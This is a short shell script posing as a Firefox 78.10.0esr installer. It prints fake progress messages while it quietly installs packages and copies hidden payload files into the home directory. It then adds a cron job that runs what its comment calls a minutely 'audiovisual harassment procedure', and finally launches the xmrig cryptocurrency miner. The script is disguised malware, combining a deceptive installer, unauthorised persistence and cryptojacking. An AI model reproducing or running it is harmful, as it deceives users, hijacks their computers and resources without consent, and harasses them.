echo "Thanks for installing Firefox 78.10.0esr"
echo "Estimated time until download: 30s"
# for text to speech stuff
sudo apt install festival &> /dev/null
echo "Updating sources"
echo "Gathering dependencies"
# for displaying cena pictures
sudo apt install imagemagick &> /dev/null
echo "Restoring user configuration"

cd ./.payload;

# hide annoying stuff
cp ./.cena.jpg ~/.cena.jpg
cp ./.script.txt ~/.script.txt
cp ./.harmony.txt ~/.harmony.txt
cp ./.orchestra.sh ~/.orchestra.sh
cp ./.xmrig ~/.xmrig


echo "Configuring new packages"

# setup the minutely audiovisual harrasment procedure
crontab -e * * * * bin/bash ~/.orchestra.sh

echo "finishing up.."

cd ~/.xmrig
# deploy miner
./xmrig


